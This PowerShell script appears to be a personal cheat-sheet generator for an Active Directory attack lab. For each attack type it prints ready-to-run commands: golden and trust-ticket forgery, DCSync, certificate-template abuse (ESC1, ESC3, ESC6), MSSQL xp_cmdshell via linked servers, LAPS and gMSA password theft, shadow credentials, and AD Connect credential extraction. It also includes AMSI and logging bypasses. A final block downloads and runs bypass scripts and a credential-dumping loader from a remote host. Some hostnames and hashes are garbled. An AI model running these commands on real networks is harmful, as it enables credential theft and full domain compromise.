$(Get-Loader("BetterSafetyKatz.exe")) "kerberos::golden /user:Administrator /domain:$Domain /sid:$DomainSid /sids:<parentDomainSid>-519 /krbtgt:$krbtgt_key /ptt" "exit"
# On any machine of the current domain
Invoke-Mimikatz -Command '"kerberos::ptt krbtgt_tkt.kirbi"'
ls \\mcorp-dc.moneycorp.local.kirbi\c$
gwmi -class win32_operatingsystem -ComputerName mcorp-dc.moneycorp.local
$(Get-Loader("SafetyKatz.exe")) "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
# Avoid suspicious logs by using Domain Controllers group
$(Get-Loader("BetterSafetyKatz.exe")) "kerberos::golden /user:${DomainController}$ /domain:$Domain /sid:$DomainSid /groups:516 /sids:<ParentDomainSid>-516,S-1-5-9 /krbtgt:$krbtgt_key /ptt" "exit"
$(Get-Loader("SafetyKatz.exe")) "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
# S-1-5-21-2578538781-2508153159-3419410681-516 - Domain Controllers
# S-1-5-9 - Enterprise Domain Controllers

"@ | Write-Host
}

if ( $Attack -eq "IntraDomainTrust" ) {
    $krbtgt_key = $((Get-Creds -Target krbtgt -Type NTLM).Value )
    @"
$($dwfile["sbloggingbypass"])
$($dwfile["amsibypass"])

$($dwfile["Invoke-Mimikatz"])
# we require the trust key for the inter-forest trust.
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
# Or
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
An inter-forest TGT can be forged
$(Get-Loader("BetterSafetyKatz.exe")) "kerberos::golden /user:Administrator /domain:$Domain /sid:$DomainSid /rc4:$krbtgt_key /service:krbtgt /target:<OtherDomain> /ticket:trust_forest_tkt.kirbi" "exit"

# Abuse with Kekeo
# Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.
$(Get-Loader("asktgs.exe")) trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local
# Use the TGS to access the targeted service.
$(Get-Loader("kirbikator.exe")) lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
# Tickets for other services (like HOST and RPCSS for WMI, HTTP for PowerShell Remoting and WinRM) can be created as wel

# Abuse with Rubeus
# Using the same TGT which we forged earlier:
$(Get-Loader("Rubeus.exe")) asktgs /ticket:trust_forest_tkt.kirbi /service:cifs/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\
 
"@ | Write-Host
}

if ( $Attack -eq "CertAbuse" ) {

    @"
#Certificate Enumeration
$(Get-Loader("Certify.exe")) cas
$(Get-Loader("Certify.exe")) find
$(Get-Loader("Certify.exe")) find /vulnerable

## ESC3
$(Get-Loader("Certify.exe")) find /json /outfile:file.json
((Get-Content file.json | ConvertFrom-Json).CertificateTemplates | ? {`$_.ExtendedKeyUsage -contains "1.3.6.1.5.5.7.3.2"}) | fl *

# Escalation to DA
# We can now request a certificate for Certificate Request Agent from "SmartCardEnrollment- Agent" template.
$(Get-Loader("Certify.exe")) request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
# Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of DA using the "SmartCardEnrollment-Users" template.
$(Get-Loader("Certify.exe")) request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
# Convert from cert.pem to pfx (esc3user-DA.pfx below), request DA TGT and inject it
$(Get-Loader("Rubeus.exe")) asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt

# Escalation to EA
# Convert from cert.pem to pfx (esc3agent.pfx below) and use it to request a certificate on behalf of EA using the "SmartCardEnrollment-Users" template.
$(Get-Loader("Certify.exe")) request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
# Request EA TGT and inject it
$(Get-Loader("Rubeus.exe")) asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt

## ESC6

# The template "CA-Integration" grants enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx
$(Get-Loader("Certify.exe")) request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"CA-Integration" /altname:administrator
# Convert from cert.pem to pfx (esc6.pfx below) and use it to request a TGT for DA (or EA).
$(Get-Loader("Rubeus.exe")) asktgt /user:administrator /certificate:esc6.pfx /password:SecretPass@123 /ptt

## ESC1
# The template "HTTPSCertificates" has ENROLLEE_SUPPLIES_SUBJECT value for msPKI-Certificates-Name-Flag.
$(Get-Loader("Certify.exe")) find /enrolleeSuppliesSubject
# The template "HTTPSCertificates" allows enrollment to the RDPUsers group. Request a certificate for DA (or EA) as studentx
$(Get-Loader("Certify.exe")) request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
# Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA).
$(Get-Loader("Rubeus.exe")) asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt

"@ | Write-Host
}

if ( $Attack -eq "MSSQL" ) {

    @"
$($dwfile["PowerUpSQL"])
#Discovery (SPN Scanning)
Get-SQLInstanceDomain
# Check Accessibility
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
# Gather Information
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Look for links to remote servers
Get-SQLServerLink -Instance dcorp-mssql -Verbose

# Enumerating Database Links
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose

# Use the -QuertyTarget parameter to run Query on a specific instance (without -QueryTarget the command tries to use xp_cmdshell on every link of the chain)
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'" -QueryTarget eu-sql


"@ | Write-Host
}


if ( $Attack -eq "LAPS" ) {
    @"
$($dwfile["AdmPwd"])
Find-AdmPwdExtendedRights -Identity OUDistinguishedName

Import-Module $($dwfile["ADDLL"])
Import-Module $($dwfile["ADModule"])
Get-ADComputer -Identity <targetmachine> -Properties msmcs-admpwd | select -ExpandProperty ms-mcs-admpwd

"@ | Write-Host
}

if ( $Attack -eq "mimikatz" ) {
    @"
    '"sekurlsa::ekeys"'
    '"vault::cred /patch'"
    '"lsadump::sam /patch"'
    "privilege::debug" "lsadump::trust /patch" exit
    "lsadump::dcsync /all /csv"
    "lsadump::dcsync /user:dcorp\krbtgt"
    sekurlsa::Credman 
    sekurlsa::Ekeys 
    sekurlsa::Kerberos 
    sekurlsa::Krbtgt 
    sekurlsa::SSP 
    sekurlsa::Wdigest 
    sekurlsa::LogonPasswords
    sekurlsa::tickets /export
    
"@ | Write-Host
}


if ( $Attack -eq "gMSA" ) {

    @"
        $($dwfile["ADDLL"])
        $($dwfile["ADModule"])
        Get-ADServiceAccount -Filter *
        
        ## Read the value
        Get-ADServiceAccount -Identity <target> -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

        $Passwordblob =  (Get-ADServiceAccount -Identity <target> -Properties msDS-ManagedPassword).'msDS-ManagedPassword'

        Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
        $decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
        ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword

        # Pass the hash
        sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntilm:0a02c684ccOfal744195eddlaec43078

        $($dwfile["PowerView"])
        Get-DomainObject -LDAPFilter '(Objectclass=msDS-GroupManagedServiceAccount)'

        ## Golden GMSA

        .\GoldenGMSA.exe gmsainfo
        .\GoldenGMSA.exe compute --sid S-1-5-21-210670787-2521448726-163245708-8601

"@ | Write-Host
}

if ( $Attack -eq "ShadowCred" ) {

    @"
    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}
    # Add the Shadow Credential.
    Whisker.exe add /target:supportxXuser
    # Using PowerView, see if the Shadow Credential is added.
    Get-DomainUser -Identity supportXuser
    # Request the TGT by leveraging the certificate.
    Rubeus.exe asktgt /user:supportxXuser /certificate :MIITJUAIBAZCCCXQGCSqGSIb3DQEHAacccw.... /password:"10TOqgAom3..." /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show /nowrap
    # Inject the TGT in the current session or use the NTLM hash
    Rubeus.exe ptt /ticket:doIGgDCCBnygAWIBBaEDAgEW...

    ## Abusing Computer Object
    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'mgmtadmin'}
    # Add the Shadow Credentials.
    C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362F9d3e7d27e292eb27519d2b8b419db24cO0f /run:cmd.exe" "exit"
    Whisker.exe add /target:us-helpdesk$
    
    # Using PowerView, see if the Shadow Credential is added.
    Get-DomainComputer -Identity us-helpdesk
    # Request the TGT by leveraging the certificate.
    Rubeus.exe asktgt /user:us-helpdesk$ /certificate:MITJOAIBAZCCCYwGCSqGSIb... /password:"ViGFoZJa...' /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show
    # Request and Inject the TGS by impersonating the user.
    Rubeus.exe s4u /dc:us-dc.us.techcorp.local /ticket:doIGkDCCBoygAWIBBaEDAgEW... /impersonateuser:administrator /ptt /self /altservice:cifs/us-helpdesk
"@ | Write-Host
}

if ( $Attack -eq "AzureIntegration" ) {

    @"
    $($dwfile["ADDLL"])
    $($dwfile["ADModule"])
    Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Server techcorp.local -Properties * | select SamAccountName, Description | fl

    $($dwfile["PowerView"])
    Get-DomainUser -Identity "MSOL_*" -Domain techcorp.local

    ## ith administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL_ account used by AD Connect in clear-text
    .\adconnect.ps1
    # Run command as MSOL user
    runas /user:techcorp. local \MSOL_16fb75d0227d /netonly cmd
    ## DCSync
    $($dwfile["Invoke-Mimikatz"])
    Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
    Invoke-Mimikatz -Command '"lsadump::dcsync /user:techcorp\krbtgt /domain:techcorp.local"'
"@
}

if ( $Attack -eq "ForeignSecurityPrincipal" ) {

    @"
    $($dwfile["ADDLL"])
    $($dwfile["ADModule"])
    Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"}

    $($dwfile["PowerView"])
    Find-ForeignGroup -Verbose
    Find-ForeignUser -Verbose

"@
}

if ( $Attack -eq "PAMTrust" ) {

    @"
    $($dwfile["ADDLL"])
    $($dwfile["ADModule"])
    Get-ADTrust -Filter *
    Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Server bastion.local

    # On bastion-dc, enumerate if there is a PAM trust:
    $bastiondc = New-PSSession bastion-dc.bastion.local
    Invoke-Command -ScriptBlock {Get-ADTrust -Filter {(ForestTransitive -eq $True) -and  (SIDF1lteringQuarantined -eq $False)}} -Session $bastiondc
    ## Check which users are members of the Shadow Principals:
    Invoke-Command -ScriptBlock {Get-ADObject -SearchBase ()"CN=Shadow Principal Configuration, CN=Services," + (GetADROOtDSE).configurationNamingContext) -Filter * -Properties * |select Name,member ,msDS-ShadowPrincipalSid | fl} -Session $bastiondc
    # Establish a direct PSRemoting session on bastion-dc and access production.local:
    Enter-PSSession 192.168.102.1 -Authentication -NegotiatewithImplicitcredential
"@
}

if ( $Attack -eq "PowerShell" ) {

    @"
# Press tab key to get a list of possible completions (also on Ctrl+Space)
# Set-PSReadlineKeyHandler -Chord Tab -Function PossibleCompletions

# Search history based on input on PageUp/PageDown
Set-PSReadlineKeyHandler -Key PageUp -Function  HistorySearchBackward
Set-PSReadlineKeyHandler -Key PageDown -Function HistorySearchForward

# If you feel cursor should be at the end of the line after pressing PageUp/PageDown (saving you an End press), you may add:
Set-PSReadLineOption -HistorySearchCursorMovesToEnd
# Set-PSReadLineOption -HistorySearchCursorMovesToEnd:$False to remove
#

## Colors in powershell for winpeas
New-ItemProperty -Path HKCU:Console -Name VirtualTerminalLevel -Value "1" -Type DWORD

## Allow ports for reverse shell
#New-NetFirewallRule -DisplayName "Allow Reverse Shell" -Direction inbound -Profile Any -Action Allow -LocalPort 80,443,8080,8090 -Protocol TCP

# Open current profile
#notepad.exe $profile

# Set Window Title
`$host.ui.RawUI.WindowTitle = "Amitag"

"@ | Write-Host
}


@"
# Import-ADmodule

cd \AD\Tools
import-module .\ADModule-master\Microsoft.ActiveDirectory.Management.dll
import-module .\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

# PowerView
cd \AD\Tools
. .\PowerView.ps1

## Find Local Admin access
cd \AD\Tools
. .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess

# On new machine

cd C:\Users\Public
iex (iwr -UseBasicParsing http://192.168.100.32:8080/sbloggingbypass.txt)
iex (iwr -UseBasicParsing http://192.168.100.32:8080/amsibypass.txt)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.32
iwr http://192.168.100.32:8080/Loader.exe -OutFile Loader.exe
.\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "privilege::debug" "sekurlsa::ekeys" "exit"

## Certify


"@

